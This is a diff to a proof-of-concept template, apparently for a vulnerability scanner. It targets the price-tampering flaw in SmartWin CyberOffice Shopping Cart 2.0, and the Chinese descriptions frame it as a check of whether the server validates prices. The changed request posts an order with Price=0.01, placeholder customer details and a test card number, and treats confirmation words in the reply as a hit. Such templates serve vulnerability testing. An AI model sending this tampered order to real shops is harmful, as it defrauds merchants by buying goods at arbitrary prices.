@@ -1,6 +1,6 @@
 [info]
-author = "ave"
-description = "通过向购物车提交包含篡改价格（Price）参数的请求，验证服务器是否缺乏对商品价格的后端校验，从而允许攻击者以任意价格购买商品。"
+author = "AVE"
+description = "检测 SmartWin CyberOffice Shopping Cart 2.0 是否存在价格修改漏洞。通过向订单处理页面提交篡改后的 Price 参数，验证服务端是否对价格参数进行校验。"
 id = "POC-AVE-2000-0679"
 name = "SmartWin CyberOffice Shopping Cart 2.0 Price Modification PoC"
 severity = "high"
@@ -11,15 +11,15 @@ vuln_id = [
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/cart.asp"
+path = "/{{BaseURL}}/shop/order.asp"
 protocol = "http"
 
 [poc.requests.body]
-content = "item_id=1&Price=0.01&quantity=1"
+content = "ProductID=1&Quantity=1&Price=0.01&Name=test&Address=test&CCNumber=4111111111111111"
 type = "raw"
 
 [poc.requests.headers]
@@ -30,7 +30,8 @@ expect = true
 part = "body"
 type = "word"
 words = [
-    "Cart",
-    "Total",
-    "0.01",
+    "order",
+    "thank you",
+    "confirmation",
+    "success",
 ]
